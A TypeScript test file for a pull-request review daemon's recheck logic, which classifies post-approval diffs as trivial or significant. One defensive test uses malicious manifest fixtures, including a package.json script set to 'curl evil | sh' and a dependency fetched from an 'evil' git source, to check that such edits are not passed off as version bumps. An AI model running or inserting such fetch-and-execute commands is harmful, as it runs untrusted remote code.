// Post-approval delta recheck.
//
// The three things these tests exist to hold down, because each one is a
// measured, costly failure mode:
//   * a trivial or empty delta must cost a classification and nothing else
//     (a delta-blind staleness check spends heavily concluding
//     "byte-identical");
//   * the path can produce ONLY APPROVE → REQUEST_CHANGES — never a re-approve
//     (repeat approvals are pure output cost) and never a park;
//   * the author-reply trigger stays inside src/pingpong.ts.
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { readFileSync } from "node:fs";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parseConfig, type Config } from "../src/config.js";
import {
  RecheckWatcher,
  classifyDelta,
  ciIsAdverse,
  digitsOnly,
  formattingOnly,
  isMigrationRenumber,
  planRecheck,
  recheckDecisionFile,
  runBaseAdvance,
  runRecheck,
  validateRecheckDecision,
  type DeltaFile,
  type RecheckAdapter,
  type RecheckDeps,
} from "../src/recheck.js";
import { StateStore } from "../src/state.js";
import { applyInterpretation, interpretEvent, type Interpretation } from "../src/webhook.js";
import { HEAVY_TIMEOUT_MS } from "./helpers/suite-timeouts.js";

const cfg: Config = parseConfig(
  readFileSync(resolve(process.cwd(), "tests/fixtures/config.toml"), "utf8"),
);
const PR = 5109;
const OLD = "1111111111111111111111111111111111111111";
const HEAD = "2222222222222222222222222222222222222222";

function file(partial: Partial<DeltaFile> & { filename: string }): DeltaFile {
  return { additions: 1, deletions: 1, status: "modified", ...partial };
}

// ---- the one classifier ---------------------------------------------------

describe("trivial-delta classifier", () => {
  it("calls a real content change significant", () => {
    const d = classifyDelta([
      file({
        filename: "src/trim.ts",
        patch: "@@\n-  return s.slice(0, n);\n+  return s.slice(0, n - 1);",
      }),
    ]);
    expect(d.class).toBe("significant");
    expect(d.significant.map((f) => f.filename)).toEqual(["src/trim.ts"]);
  });

  it("calls a whitespace-only change formatting", () => {
    const d = classifyDelta([
      file({ filename: "src/app.ts", patch: "@@\n-if(a){b()}\n+if (a) {\n+  b()\n+}" }),
    ]);
    expect(d.class).toBe("trivial");
    expect(d.files[0]?.reason).toBe("formatting");
  });

  it("keeps a Python indentation change significant — it can move a line out of a block", () => {
    // Dropping every whitespace character would make a dedent out of an `if`
    // body read as formatting.
    const d = classifyDelta([
      file({
        filename: "app/views.py",
        patch: "@@\n     if ok:\n         log()\n-        return x\n+    return x",
      }),
    ]);
    expect(d.class).toBe("significant");
    expect(formattingOnly("@@\n-  a: 1\n+a: 1", "conf/app.yaml")).toBe(false);
  });

  it("still calls trailing / in-line whitespace in Python formatting", () => {
    const d = classifyDelta([
      file({ filename: "app/views.py", patch: "@@\n-    x = f(a,b)   \n+    x = f(a, b)" }),
    ]);
    expect(d.class).toBe("trivial");
    expect(d.files[0]?.reason).toBe("formatting");
  });

  it("keeps a whitespace change inside a string literal significant", () => {
    expect(formattingOnly('@@\n-return "a b";\n+return "ab";', "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-x = 'a  b'\n+x = 'a b'", "app/x.py")).toBe(false);
    // …while whitespace around the literal is still formatting.
    expect(formattingOnly('@@\n-return   "a b";\n+return "a b";', "src/x.ts")).toBe(true);
  });

  it("keeps a whitespace change inside a regex literal significant", () => {
    expect(formattingOnly("@@\n-const pattern = /a b/;\n+const pattern = /ab/;", "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-if (/[ ]x/.test(s)) f();\n+if (/[]x/.test(s)) f();", "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-return /a  b/g;\n+return /a b/g;", "src/x.ts")).toBe(false);
    expect(digitsOnly("@@\n-const p = /a b/;\n+const p = /ab/;", "app/migrations/0043_x.py")).toBe(false);
    // …while whitespace around it is still formatting.
    expect(formattingOnly("@@\n-const pattern =   /a b/;\n+const pattern = /a b/;", "src/x.ts")).toBe(true);
    expect(formattingOnly("@@\n-    return /a b/;\n+  return /a b/;", "src/x.ts")).toBe(true);
    expect(formattingOnly("@@\n-x = a / b;\n+x = a/b;", "src/x.ts")).toBe(true);
  });

  it("errs toward significant whenever a `/` could open a regex", () => {
    // A division pair is not told apart from a regex: held significant.
    expect(formattingOnly("@@\n-x = a / b / c;\n+x = a/b/c;", "src/x.ts")).toBe(false);
    // A JSX closing tag followed by a string holding `/`.
    expect(formattingOnly('@@\n-<b>x</b>{" / q r"}\n+<b>x</b>{" / qr"}', "src/x.tsx")).toBe(false);
    expect(formattingOnly('@@\n-<span>{a}</span>{" / "}{b}\n+<span>{a}</span>{" /"}{b}', "src/x.tsx")).toBe(false);
    // A `<` comparison followed by a string holding `/`.
    expect(formattingOnly('@@\n-x = y</2; s = "a b / c d"\n+x = y</2; s = "a b / cd"', "src/x.ts")).toBe(false);
    expect(formattingOnly('@@\n-if (a < b) s = "p / q r";\n+if (a < b) s = "p / qr";', "src/x.ts")).toBe(false);
    // Whitespace around those lines is still formatting.
    expect(formattingOnly('@@\n-  <b>x</b>{" / q r"}\n+    <b>x</b>{" / q r"}', "src/x.tsx")).toBe(true);
  });

  it("stays linear on a long unterminated slash run", () => {
    const line = `= /${"[".repeat(50000)}`;
    const t0 = Date.now();
    expect(formattingOnly(`@@\n-${line}\n+${line} `, "src/x.ts")).toBe(true);
    expect(Date.now() - t0).toBeLessThan(1000);
  });

  it("keeps a whitespace change that merges or splits tokens significant", () => {
    // Both sides squash to `constn=a+++b;`, yet a different variable is incremented.
    expect(formattingOnly("@@\n-const n = a + ++b;\n+const n = a++ + b;", "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-x = a - -b;\n+x = a --b;", "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-return value;\n+returnvalue;", "src/x.ts")).toBe(false);
    // A line break is a token boundary too.
    expect(formattingOnly("@@\n-return\n-value;\n+returnvalue;", "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-    x = a + ++b\n+    x = a++ + b", "app/x.py")).toBe(false);
    expect(
      digitsOnly("@@\n-n = a + ++b  # 0042_x\n+n = a++ + b  # 0043_x", "app/migrations/0043_x.py"),
    ).toBe(false);
    // …while re-spacing that keeps every token is still formatting.
    expect(formattingOnly("@@\n-const n=a+b;\n+const  n = a + b;", "src/x.ts")).toBe(true);
    expect(formattingOnly("@@\n-return f(a,b);\n+return f(\n+  a,\n+  b\n+);", "src/x.ts")).toBe(true);
  });

  it("keeps a line break that can end a statement significant", () => {
    // `return\nvalue;` returns undefined.
    expect(formattingOnly("@@\n-return value;\n+return\n+value;", "src/x.ts")).toBe(false);
    expect(formattingOnly("@@\n-return (value);\n+return\n+(value);", "src/x.ts")).toBe(false);
    expect(formattingOnly('@@\n-throw "x";\n+throw\n+"x";', "src/x.js")).toBe(false);
    // `a++; b` against `a; ++b`.
    expect(formattingOnly("@@\n-a++\n-b\n+a\n+++b", "src/x.ts")).toBe(false);
    // Two shell commands against one, wherever the break falls.
    expect(formattingOnly("@@\n-run x -y\n+run x\n+-y", "scripts/x.sh")).toBe(false);
    expect(formattingOnly("@@\n-a b\n+a\n+b", "src/x.ts")).toBe(false);
    const d = classifyDelta([file({ filename: "src/x.ts", patch: "@@\n-return value;\n+return\n+value;" })], {
      prFiles: new Set(["src/x.ts"]),
    });
    expect(d.class).toBe("significant");
    // …while a re-flow that ends no statement, and a shell re-indent, are formatting.
    expect(formattingOnly("@@\n-const x = a && b;\n+const x = a &&\n+  b;", "src/x.ts")).toBe(true);
    expect(formattingOnly("@@\n-return f(a, b);\n+return f(\n+  a,\n+  b\n+);", "src/x.ts")).toBe(true);
    expect(formattingOnly("@@\n-  run x -y\n+    run  x -y", "scripts/x.sh")).toBe(true);
  });

  it("does not call a reordering formatting", () => {
    expect(formattingOnly("@@\n-a()\n-b()\n+b()\n+a()")).toBe(false);
  });

  it("calls a lockfile and a version bump trivial", () => {
    const d = classifyDelta([
      file({ filename: "package-lock.json", additions: 400, deletions: 380 }),
      file({
        filename: "package.json",
        patch: '@@\n-  "version": "1.2.3",\n+  "version": "1.2.4",',
      }),
    ]);
    expect(d.class).toBe("trivial");
    expect(d.files.map((f) => f.reason)).toEqual(["version-bump", "version-bump"]);
  });

  // "Every changed line mentions version" is not a release bump: dependency
  // and script edits that merely carry the word must not pass as one.
  it("calls a manifest edit that only MENTIONS version significant", () => {
    const cases: Array<[string, string]> = [
      ["Cargo.toml", '@@\n+evil = { version = "1", git = "https://example.com/evil" }'],
      [
        "Cargo.toml",
        '@@\n-serde = { version = "1", features = ["derive"] }\n+serde = { version = "1", features = ["derive", "rc"] }',
      ],
      [
        "pyproject.toml",
        '@@\n-requests = { version = "^2.0" }\n+requests = { version = "^2.0", source = "evil" }',
      ],
      ["package.json", '@@\n-    "version": "npm run build",\n+    "version": "curl evil | sh",'],
    ];
    for (const [filename, patch] of cases) {
      const d = classifyDelta([file({ filename, patch })]);
      expect(d.class, `${filename}: ${patch}`).toBe("significant");
    }
  });

  it("still calls a bare release-version bump trivial in every manifest", () => {
    const cases: Array<[string, string]> = [
      ["package.json", '@@\n-  "version": "1.2.3",\n+  "version": "1.2.4",'],
      ["pyproject.toml", '@@\n-version = "0.4.1"\n+version = "0.4.2"'],
      ["Cargo.toml", "@@\n-version = '0.4.1'\n+version = '0.5.0'"],
    ];
    for (const [filename, patch] of cases) {
      const d = classifyDelta([file({ filename, patch })]);
      expect(d.files[0]?.reason, `${filename}: ${patch}`).toBe("version-bump");
    }
  });

  // A renamed migration WITH churn but no patch (GitHub omits it on large
  // files) proves nothing, so it must not classify as a renumber.
  it("keeps a renamed migration with churn and no patch significant", () => {
    const d = classifyDelta([
      file({
        filename: "app/migrations/0043_add_col.py",
        previous_filename: "app/migrations/0042_add_col.py",
        status: "renamed",
        additions: 40,
        deletions: 3,
      }),
    ]);
    expect(d.class).toBe("significant");
  });

  it("calls a package.json dependency edit significant", () => {
    const d = classifyDelta([
      file({
        filename: "package.json",
        patch: '@@\n-  "better-sqlite3": "^11",\n+  "better-sqlite3": "^12",',
      }),
    ]);
    expect(d.class).toBe("significant");
  });

  it("calls a migration renumber trivial — as a rename", () => {
    expect(
      isMigrationRenumber("app/migrations/0042_add_col.py", "app/migrations/0043_add_col.py"),
    ).toBe(true);
    const d = classifyDelta([
      file({
        filename: "app/migrations/0043_add_col.py",
        previous_filename: "app/migrations/0042_add_col.py",
        status: "renamed",
        patch:
          '@@\n-    dependencies = [("app", "0041_prev")]\n+    dependencies = [("app", "0042_prev")]',
      }),
    ]);
    expect(d.class).toBe("trivial");
    expect(d.files[0]?.reason).toBe("migration-renumber");
  });

  it("keeps a renamed migration significant when a semantic numeric constant changed", () => {
    // digitsOnly masks digit runs only in the NNNN_name shape a migration
    // filename or dependencies entry carries — a batch size (or timeout,
    // default…) changing inside a renamed migration is a real content edit,
    // not part of the renumber.
    const d = classifyDelta([
      file({
        filename: "app/migrations/0043_add_col.py",
        previous_filename: "app/migrations/0042_add_col.py",
        status: "renamed",
        patch:
          '@@\n-    dependencies = [("app", "0041_prev")]\n+    dependencies = [("app", "0042_prev")]\n@@\n-    BATCH_SIZE = 500\n+    BATCH_SIZE = 1000',
      }),
    ]);
    expect(d.class).toBe("significant");
    expect(d.files[0]?.reason).toBe("content");
  });

  it("calls a migration renumber trivial — as a delete + add pair", () => {
    const d = classifyDelta([
      file({
        filename: "app/migrations/0042_add_col.py",
        status: "removed",
        additions: 0,
        deletions: 3,
        patch:
          '@@\n-class Migration:\n-    dependencies = [("app", "0041_prev")]\n-    operations = [AddField(model_name="user", name="email")]',
      }),
      file({
        filename: "app/migrations/0043_add_col.py",
        status: "added",
        additions: 3,
        deletions: 0,
        patch:
          '@@\n+class Migration:\n+    dependencies = [("app", "0042_prev")]\n+    operations = [AddField(model_name="user", name="email")]',
      }),
    ]);
    expect(d.class).toBe("trivial");
    expect(d.files.every((f) => f.reason === "migration-renumber")).toBe(true);
  });

  it("keeps a delete + add migration pair significant when the DDL changed", () => {
    // The filenames alone must not make the pair trivial. GitHub reports a
    // rename as delete + add exactly when similarity is LOW — i.e. when the content changed most.
    const d = classifyDelta([
      file({
        filename: "app/migrations/0042_add_col.py",
        status: "removed",
        additions: 0,
        deletions: 1,
        patch: '@@\n-    operations = [AddField(model_name="user", name="email")]',
      }),
      file({
        filename: "app/migrations/0043_add_col.py",
        status: "added",
        additions: 1,
        deletions: 0,
        patch: '@@\n+    operations = [RemoveField(model_name="user", name="email")]',
      }),
    ]);
    expect(d.class).toBe("significant");
  });

  it("keeps a delete + add migration pair significant when a patch is missing", () => {
    // GitHub omits `patch` on large files: the content cannot be proven
    // mechanical, so the pair is not a renumber.
    const d = classifyDelta([
      file({ filename: "app/migrations/0042_add_col.py", status: "removed", deletions: 30 }),
      file({ filename: "app/migrations/0043_add_col.py", status: "added", additions: 30 }),
    ]);
    expect(d.class).toBe("significant");
  });

  it("keeps a renamed migration whose DDL changed significant", () => {
    const d = classifyDelta([
      file({
        filename: "app/migrations/0043_add_col.py",
        previous_filename: "app/migrations/0042_add_col.py",
        status: "renamed",
        patch:
          '@@\n-    AddField(model_name="user", name="email")\n+    RemoveField(model_name="user", name="email")',
      }),
    ]);
    expect(d.class).toBe("significant");
  });

  it("calls a file the PR does not own a base merge", () => {
    const d = classifyDelta(
      [
        file({ filename: "other/service.py", patch: "@@\n-x = 1\n+x = 2" }),
        file({ filename: "src/mine.ts", patch: "@@\n-y = 1\n+y = 2" }),
      ],
      { prFiles: new Set(["src/mine.ts"]) },
    );
    expect(d.files.map((f) => f.reason)).toEqual(["base-merge", "content"]);
    expect(d.significant.map((f) => f.filename)).toEqual(["src/mine.ts"]);
  });

  it("classifies an empty delta as empty", () => {
    expect(classifyDelta([]).class).toBe("empty");
  });
});

// ---- the plan -------------------------------------------------------------

const significant = [file({ filename: "src/app.ts", patch: "@@\n-a()\n+b()" })];

function plan(
  over: Partial<Parameters<typeof planRecheck>[0]> = {},
): ReturnType<typeof planRecheck> {
  return planRecheck({
    trigger: "push",
    standing: "APPROVE",
    last_reviewed_sha: OLD,
    head_sha: HEAD,
    delta: significant,
    ...over,
  });
}

describe("planRecheck", () => {
  it("rechecks a push carrying production code the review has not seen", () => {
    const p = plan();
    expect(p.action).toBe("recheck");
  });

  it("hands the author-reply trigger to ping-pong, whatever the delta", () => {
    const p = plan({ trigger: "author_reply" });
    expect(p).toMatchObject({ action: "noop", reason: "pingpong-owns-reply" });
  });

  it.each(["REQUEST_CHANGES", "NEEDS_HUMAN", null, undefined, "garbage"])(
    "does nothing when the standing verdict is %s — only an approve can be moved",
    (standing) => {
      expect(plan({ standing: standing as string | null })).toMatchObject({
        action: "noop",
        reason: "no-standing-approval",
      });
    },
  );

  it("is a no-op on an unchanged head", () => {
    expect(plan({ head_sha: OLD })).toMatchObject({ action: "noop", reason: "unchanged-head" });
  });

  it("is a no-op when CI merely goes green at the reviewed head", () => {
    expect(plan({ trigger: "ci", head_sha: OLD, ci: { conclusion: "success" } })).toMatchObject({
      action: "noop",
      reason: "unchanged-head",
    });
  });

  it("rechecks when CI concludes badly at the approved head", () => {
    expect(ciIsAdverse("failure")).toBe(true);
    expect(
      plan({ trigger: "ci", head_sha: OLD, delta: [], ci: { conclusion: "failure" } }),
    ).toMatchObject({
      action: "recheck",
    });
  });

  it("is a no-op on an empty delta", () => {
    expect(plan({ delta: [] })).toMatchObject({ action: "noop", reason: "empty-delta" });
  });

  it("is a no-op on a trivial delta and upholds the standing verdict", () => {
    const p = plan({ delta: [file({ filename: "yarn.lock", additions: 90, deletions: 90 })] });
    expect(p).toMatchObject({ action: "noop", reason: "trivial-delta" });
  });

  it("resolves a base advance that touches no PR-owned file to a no-op", () => {
    const p = plan({
      trigger: "base_advance",
      head_sha: OLD, // a base advance never moves the PR's head
      delta: [file({ filename: "unrelated/service.py", patch: "@@\n-x=1\n+x=2" })],
      prFiles: ["src/mine.ts"],
    });
    expect(p).toMatchObject({ action: "noop", reason: "trivial-delta" });
    expect(p.classification?.files[0]?.reason).toBe("base-merge");
  });

  it("rechecks a base advance that lands on a file the PR also touches", () => {
    const p = plan({
      trigger: "base_advance",
      head_sha: OLD,
      delta: [file({ filename: "src/mine.ts", patch: "@@\n-x=1\n+x=2" })],
      prFiles: ["src/mine.ts"],
    });
    expect(p.action).toBe("recheck");
  });
});

// ---- the runner -----------------------------------------------------------

class FakeAdapter implements RecheckAdapter {
  calls: string[] = [];
  base_ref = "master";
  delta: DeltaFile[] = significant;
  own: DeltaFile[] = [file({ filename: "src/app.ts" })];

  async getPr(
    n: number,
  ): Promise<{ base_ref: string; head_sha: string; state: string; merged: boolean }> {
    this.calls.push(`getPr:${n}`);
    return { base_ref: this.base_ref, head_sha: HEAD, state: "open", merged: false };
  }
  async listPrFiles(n: number): Promise<DeltaFile[]> {
    this.calls.push(`listPrFiles:${n}`);
    return this.own;
  }
  /** What the PR owned at the reviewed head (`compare <base_ref>...<reviewed>`);
   * undefined ⇒ the same as it owns now. */
  ownedAtReview: DeltaFile[] | undefined;
  async compareFiles(base: string, head: string): Promise<DeltaFile[]> {
    this.calls.push(`compare:${base.slice(0, 4)}..${head.slice(0, 4)}`);
    if (base === this.base_ref) return this.ownedAtReview ?? this.own;
    return this.delta;
  }
}

interface Harness {
  store: StateStore;
  adapter: FakeAdapter;
  injected: Array<{ pr: number; message: string }>;
  deps: RecheckDeps;
}

function harness(over: Partial<RecheckDeps> = {}): Harness {
  const store = new StateStore(":memory:");
  store.upsertPr({
    number: PR,
    state: "tracked",
    head_sha: HEAD,
    title: "Rewrite trimToLimit",
    author: "alice",
    trigger_ts: null,
    stale_recheck: 0,
    migration_gate: 0,
  });
  store.recordReviewedHead(PR, { head_sha: OLD, verdict: "APPROVE", round_no: 1 });
  const adapter = new FakeAdapter();
  const injected: Array<{ pr: number; message: string }> = [];
  const deps: RecheckDeps = {
    cfg,
    store,
    adapter,
    inject: async (pr, message) => {
      injected.push({ pr, message });
    },
    log: () => {},
    ...over,
  };
  return { store, adapter, injected, deps };
}

describe("runRecheck", () => {
  it(
    "nudges the PR's own session once, and never again for the same trigger",
    { timeout: HEAVY_TIMEOUT_MS },
    async () => {
      const h = harness();
      const first = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
      expect(first).toMatchObject({ action: "recheck", delivered: "injected" });
      expect(h.injected).toHaveLength(1);
      expect(h.injected[0]?.pr).toBe(PR);
      expect(h.store.rechecksFor(PR)).toHaveLength(1);

      const second = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
      expect(second).toMatchObject({ action: "noop", reason: "already-rechecked" });
      expect(h.injected).toHaveLength(1);
    },
  );

  // A failed inject must not burn the head's only recheck — a kept claim
  // would dedupe every retry forever.
  it("releases the claim when delivery fails, so the next sweep retries", async () => {
    const h = harness();
    const realInject = h.deps.inject;
    h.deps.inject = async () => {
      throw new Error("no live session pr-101 — dispatch a round to birth it first");
    };
    const failed = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(failed).toMatchObject({ action: "noop", reason: "delivery-failed" });
    expect(h.store.rechecksFor(PR)).toHaveLength(0);

    h.deps.inject = realInject;
    const retried = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(retried).toMatchObject({ action: "recheck", delivered: "injected" });
    expect(h.injected).toHaveLength(1);
  });

  it("carries the standing verdict, the last-reviewed sha and the delta in the order", async () => {
    const h = harness();
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out.order).toMatchObject({
      standing_verdict: "APPROVE",
      last_reviewed_sha: OLD,
      head_sha: HEAD,
      decision_file: recheckDecisionFile(PR, HEAD),
    });
    expect(out.order?.files.map((f) => f.filename)).toEqual(["src/app.ts"]);
  });

  it("holds the nudge while a round is in flight (single-shepherd S4)", async () => {
    const h = harness();
    h.store.startRound(PR, "re-review", ["pass-baseline"], 60);
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out.delivered).toBe("held");
    expect(h.injected).toHaveLength(0);
    expect(h.store.heldWakes(PR)).toHaveLength(1);
  });

  it("posts nothing and asks nothing of the session for a trivial delta", async () => {
    const h = harness();
    h.adapter.delta = [file({ filename: "yarn.lock", additions: 200, deletions: 200 })];
    h.adapter.own = [file({ filename: "yarn.lock" })];
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "noop", reason: "trivial-delta" });
    expect(h.injected).toHaveLength(0);
    // A trivial answer is terminal for this head: the claim is recorded so
    // the reconcile backstop never re-classifies the same question per sweep.
    expect(h.store.rechecksFor(PR)).toHaveLength(1);
    expect(h.store.rechecksFor(PR)[0]?.reason).toBe("noop:trivial-delta");
    // No wake went out, so no receipt token can ever exist for it: the claim
    // is written un-nudged and the undelivered sweep never reads its absence
    // as a lost nudge.
    expect(h.store.rechecksFor(PR)[0]?.nudged).toBe(0);
    // The standing verdict is untouched — uphold is the default, not an action.
    expect(h.store.reviewedHead(PR)?.verdict).toBe("APPROVE");
    expect(h.store.getPr(PR)?.state).toBe("tracked");
  });

  // GitHub caps a compare at 300 files. A 300+ file base merge with a
  // PR-owned edit past file 300 would read all base-merge, so the recheck
  // would no-op and CLAIM the head — an approval standing over code no one
  // read. A truncated delta is significant by construction.
  it("a delta GitHub truncated is significant, whatever the visible files say", async () => {
    const h = harness();
    const visible = Array.from({ length: 300 }, (_, i) =>
      file({ filename: `vendor/base_${i}.py`, additions: 1, deletions: 1 }),
    );
    h.adapter.delta = Object.assign(visible, { truncated: true });
    h.adapter.own = [file({ filename: "src/app.ts" })];
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "recheck", class: "significant" });
    expect(out.order?.evidence).toMatch(/truncated/);
    expect(h.injected).toHaveLength(1);
    expect(h.store.rechecksFor(PR)[0]?.reason ?? "").not.toMatch(/^noop:/);
    // A real nudge: its receipt is the sweep's to look for.
    expect(h.store.rechecksFor(PR)[0]?.nudged).toBe(1);
  });

  // An incomplete PR file list is not an ownership answer —
  // a PR-owned file missing from it would read as base-merge, i.e. trivial.
  it("a truncated PR file list is not used to call a delta file base-merge", async () => {
    const h = harness();
    h.adapter.delta = [file({ filename: "src/owned_past_the_cap.py", additions: 5, deletions: 5 })];
    h.adapter.own = Object.assign([file({ filename: "src/app.ts" })], { truncated: true });
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "recheck", class: "significant" });
  });

  // A hand-resolved conflict is
  // never trivial — the resolved file escapes the base-merge ownership rule
  // and the session is asked to audit it against both merge parents.
  it("a resolved conflict file turns an otherwise-trivial base merge into a session recheck", async () => {
    const h = harness({
      resolvedFilesInMerges: async () => ({ files: ["src/base_only.py"], degraded: false }),
    });
    // The delta is entirely outside the PR's own files — trivially base-merge
    // under the ownership rule alone.
    h.adapter.delta = [file({ filename: "src/base_only.py", additions: 5, deletions: 5 })];
    h.adapter.own = [file({ filename: "src/app.ts" })];
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "recheck" });
    expect(out.order?.resolved_files).toEqual(["src/base_only.py"]);
    expect(h.injected).toHaveLength(1);
  });

  it("a clean merge (detector finds nothing) stays a trivial no-op", async () => {
    const h = harness({ resolvedFilesInMerges: async () => ({ files: [], degraded: false }) });
    h.adapter.delta = [file({ filename: "src/base_only.py", additions: 5, deletions: 5 })];
    h.adapter.own = [file({ filename: "src/app.ts" })];
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "noop", reason: "trivial-delta" });
    expect(h.injected).toHaveLength(0);
  });

  it("a degraded merge check keeps prior behaviour but logs — never silently quieter", async () => {
    const h = harness({ resolvedFilesInMerges: async () => ({ files: [], degraded: true }) });
    h.adapter.delta = [file({ filename: "src/base_only.py", additions: 5, deletions: 5 })];
    h.adapter.own = [file({ filename: "src/app.ts" })];
    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    const kinds = (
      h.store.db.prepare("SELECT kind FROM events WHERE pr = ?").all(PR) as Array<{ kind: string }>
    ).map((e) => e.kind);
    expect(kinds).toContain("recheck_merge_verify_degraded");
    // Degraded is also never unqueryable — a durable anomaly record.
    const anomalies = h.store.anomalies();
    expect(anomalies).toHaveLength(1);
    expect(anomalies[0]).toMatchObject({ kind: "recheck_merge_verify_degraded", pr: PR });
    expect(anomalies[0]!.detail).toContain("merge-verify degraded");
  });

  // Carry-forward: a withheld approval moves with the head when the delta
  // upholds — otherwise the CI-gate retry no-ops on "head-moved" forever and
  // the never-posted approval is stranded.
  it("a trivial-delta noop carries the withheld-approval mark to the new head", async () => {
    const h = harness();
    h.store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
    h.adapter.delta = [file({ filename: "yarn.lock", additions: 2, deletions: 2 })];
    h.adapter.own = [file({ filename: "yarn.lock" })];
    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(h.store.approvalWithheld(PR)?.head_sha).toBe(HEAD);
    // The classifier verdict that caused the withhold rides along.
    expect(h.store.approvalWithheld(PR)?.ci_state).toBe("red");
    expect(h.store.approvalWithheld(PR)?.reason).toBe("red-ci");
  });

  it("a significant delta does NOT carry the mark — that waits for the session's uphold", async () => {
    const h = harness();
    h.store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(h.store.approvalWithheld(PR)?.head_sha).toBe(OLD);
  });

  // Ownership read only at the CURRENT head would label a post-approval
  // REVERSION of a reviewed file base-merge — the file leaves the PR's diff
  // exactly because the push undid it.
  it("a push reverting a reviewed file to its base content is significant, not base-merge", async () => {
    const h = harness();
    h.adapter.ownedAtReview = [file({ filename: "app/auth.py" }), file({ filename: "app/api.py" })];
    h.adapter.own = [file({ filename: "app/api.py" })];
    h.adapter.delta = [
      file({
        filename: "app/auth.py",
        patch: "@@\n-    if not user.is_staff:\n-        raise Forbidden()\n+    pass",
      }),
    ];
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "recheck" });
    expect(h.injected).toHaveLength(1);
  });

  it("a file the PR never owned at either head stays a trivial base-merge", async () => {
    const h = harness();
    h.adapter.ownedAtReview = [file({ filename: "src/app.ts" })];
    h.adapter.own = [file({ filename: "src/app.ts" })];
    h.adapter.delta = [file({ filename: "src/base_only.py", additions: 5, deletions: 5 })];
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "noop", reason: "trivial-delta" });
  });

  // Two overlapping trivial rechecks: the older one finishing last must not
  // carry the withheld mark BACK to the older head.
  it("a stale trivial recheck never carries the withheld mark off the PR's current head", async () => {
    const H3 = "3333333333333333333333333333333333333333";
    const h = harness();
    h.store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
    h.adapter.delta = [file({ filename: "yarn.lock", additions: 2, deletions: 2 })];
    h.adapter.own = [file({ filename: "yarn.lock" })];
    // The newer push already landed and was handled: the PR is at H3 and the
    // mark was carried there.
    h.store.upsertPr({ ...h.store.getPr(PR)!, head_sha: H3 });
    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: H3 });
    expect(h.store.approvalWithheld(PR)?.head_sha).toBe(H3);
    // The older push's handler finishes late.
    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(h.store.approvalWithheld(PR)?.head_sha).toBe(H3);
  });

  it("spends no API call at all on an unchanged head", async () => {
    const h = harness();
    h.store.upsertPr({ ...h.store.getPr(PR)!, head_sha: OLD });
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push" });
    expect(out).toMatchObject({ action: "noop", reason: "unchanged-head" });
    expect(h.adapter.calls).toEqual([]);
    expect(h.injected).toHaveLength(0);
  });

  it("does nothing on a PR whose standing verdict is not an approve", async () => {
    const h = harness();
    h.store.recordReviewedHead(PR, { head_sha: OLD, verdict: "REQUEST_CHANGES", round_no: 1 });
    const out = await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(out).toMatchObject({ action: "noop", reason: "no-standing-approval" });
    expect(h.adapter.calls).toEqual([]);
  });

  it("leaves the author reply to ping-pong: no reads, no nudge", async () => {
    const h = harness();
    const out = await runRecheck(h.deps, { pr: PR, trigger: "author_reply" });
    expect(out).toMatchObject({ action: "noop", reason: "pingpong-owns-reply" });
    expect(h.adapter.calls).toEqual([]);
    expect(h.injected).toHaveLength(0);
  });

  it("uses only read calls — no mutation surface is reachable from here", async () => {
    const h = harness();
    await runRecheck(h.deps, { pr: PR, trigger: "push", head_sha: HEAD });
    expect(
      h.adapter.calls.every(
        (c) => c.startsWith("compare:") || c.startsWith("listPrFiles:") || c.startsWith("getPr:"),
      ),
    ).toBe(true);
    // The adapter has no mutating method at all: a write would be a type error,
    // and every real write in this daemon goes through the MutationGate.
    expect(Object.getOwnPropertyNames(Object.getPrototypeOf(h.adapter)).sort()).toEqual([
      "compareFiles",
      "constructor",
      "getPr",
      "listPrFiles",
    ]);
  });
});

describe("runBaseAdvance", () => {
  it("is a no-op when the base advance touches no PR-owned file", async () => {
    const h = harness();
    h.adapter.delta = [file({ filename: "unrelated/service.py", patch: "@@\n-x=1\n+x=2" })];
    h.adapter.own = [file({ filename: "src/app.ts" })];
    const out = await runBaseAdvance(h.deps, { branch: "master", before: "b0", after: "b1" });
    expect(out.get(PR)).toMatchObject({ action: "noop", reason: "trivial-delta" });
    expect(h.injected).toHaveLength(0);
  });

